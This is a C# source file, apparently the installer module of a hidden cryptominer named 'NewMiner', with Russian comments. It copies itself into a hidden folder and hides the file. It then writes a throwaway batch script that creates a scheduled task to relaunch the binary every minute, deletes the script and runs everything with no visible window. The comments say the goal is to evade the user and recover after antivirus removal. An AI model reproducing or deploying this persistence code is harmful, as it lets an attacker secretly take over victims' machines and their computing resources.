using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace NewMiner
{
    internal class Panel
    {
        public static void Install()
        {
            if(!File.Exists(Settings.panelPath)) //Если файла нет(к примеру удален антивирусом) идем дальше
            {
                if (!Directory.Exists(Settings.GenDir)) //Если папки нет, то создаем папку
                {
                    DirectoryInfo info = new DirectoryInfo(Settings.GenDir); //ДА КТО ЖЕ ЭТОТ ВАШ Settings.cs !!!!!!
                    info.Create();
                    info.Attributes = FileAttributes.Hidden; //скрываем папочку
                }
                try
                {
                    File.Copy(Assembly.GetExecutingAssembly().Location, Settings.panelPath); 
                    File.SetAttributes(Settings.panelPath, FileAttributes.Hidden); //Копируем самого себя в папку и скрываемся

                    try
                    {
                        string cmd = Path.GetTempFileName() + ".cmd"; //Создаем в Temp бат файл для себя
                        using (StreamWriter sw = new StreamWriter(cmd))
                        {
                            sw.WriteLine("[USER=3638122]@Echo[/USER] off"); // скрываем консоль
                            sw.WriteLine("timeout 4 > NUL"); // Задержка до выполнения следующих команд
                            sw.WriteLine("schtasks.exe " + "/create /f /sc MINUTE /mo 1 /tn " + @"""" + Settings.panelProc + @"""" + " /tr " + @"""'" + Settings.GenDir + "\\" + Settings.panelProc + ".exe" + @"""'"); // Прыгаем в планировщик
                            sw.WriteLine("CD " + Path.GetTempPath()); // Переходим во временную папку юзера
                            sw.WriteLine("DEL " + "\"" + cmd + "\"" + " /f /q"); // Удаляем cmd
                        }
                        Process.Start(new ProcessStartInfo() //Запускаем бат файл. Скрытно , без всяких окон и прочего.
                        {
                            FileName = cmd,
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                        Environment.Exit(0);
                    }
                    catch { }
                }
                catch { }
            }
        }
    }
}